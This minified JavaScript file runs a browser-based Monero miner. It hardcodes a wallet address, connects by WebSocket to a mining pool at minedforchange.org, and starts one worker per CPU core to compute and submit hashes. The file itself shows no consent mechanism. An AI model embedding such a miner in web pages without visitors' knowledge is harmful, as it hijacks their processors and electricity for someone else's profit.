// Verify this address
const mining_address="489WzMtWjeKSaDCuNdxJSEftaLxDPeUUQHdYWMVE54RJgMHVLmtzp3p5q9ziYf2kwTXceD5pxzm574MmQpvpEPvbDWuvhU8";
var connected=0,reconnector=0,timerId=0,throttleMiner=0,handshake=null,msgId,gMinerId,job=null,workers=[],ws,receiveStack=[],sendStack=[],totalhashes=0,server="wss://xmr.minedforchange.org";function addWorkers(a){if(logicalProcessors=a,-1==a){try{logicalProcessors=window.navigator.hardwareConcurrency}catch(b){logicalProcessors=4}0<logicalProcessors&&40>logicalProcessors||(logicalProcessors=4)}for(;0<logicalProcessors--;)addWorker()}var openWebSocket=function(){null!=ws&&ws.close(),ws=new WebSocket(server),ws.onmessage=on_servermsg,ws.onerror=function(){2>connected&&(connected=2),job=null},ws.onclose=function(){2>connected&&(connected=2),job=null},ws.onopen=function(){ws.send(JSON.stringify(handshake)),connected=1}};reconnector=function(){3!=connected&&(null==ws||0!==ws.readyState&&1!==ws.readyState)&&openWebSocket()};function startMining(a=-1,b=""){msgId=1,gMinerId=b,connected=0,handshake={method:"login",params:{minerId:b,address:mining_address,agent:navigator.userAgent},id:msgId},addWorkers(a),reconnector(),timerId=setInterval(reconnector,1e4)}function stopMining(){connected=3,0!=timerId&&clearInterval(timerId),null!=ws&&ws.close(),deleteAllWorkers(),job=null}function addWorker(){var a=new XMLHttpRequest;a.addEventListener("load",function(){var b=window.URL.createObjectURL(new Blob([a.responseText])),c=new Worker(b);workers.push(c),c.onmessage=on_workermsg,setTimeout(function(){informWorker(c)},2e3)}.bind(this),a),a.open("get","/js/worker.js",!0),a.send()}function removeWorker(){if(!(1>workers.length)){var a=workers.shift();a.terminate()}}function deleteAllWorkers(){for(i=0;i<workers.length;i++)workers[i].terminate();workers=[]}function informWorker(a){on_workermsg({data:"keepalive",target:a})}function on_servermsg(a){var b=JSON.parse(a.data);b.hasOwnProperty("params")&&(receiveStack.push(b),("job"==b.method||"reply"==b.method&&b.params.hasOwnProperty("job_id"))&&(job=b.params)),"reply"==b.method&&b.hasOwnProperty("error")&&null!=b.error&&("Mining address invalid!"==b.error.message?console.log("Error: Try refresh this page. Or are you trying to do something silly!?"):console.log("Error: Try refresh this page."))}function on_workermsg(a){var b=a.target;if(1!=connected)return void setTimeout(function(){informWorker(b)},2e3);if("none"!=a.data&&"keepalive"!=a.data){var c=JSON.parse(a.data);c.minerId=gMinerId,ws.send(JSON.stringify({method:"submit",params:c,id:++msgId})),sendStack.push(c)}if(null===job)return void setTimeout(function(){informWorker(b)},2e3);var d={job:job,throttle:Math.max(0,Math.min(throttleMiner,100))};b.postMessage(d),"keepalive"!=a.data&&(totalhashes+=1)}
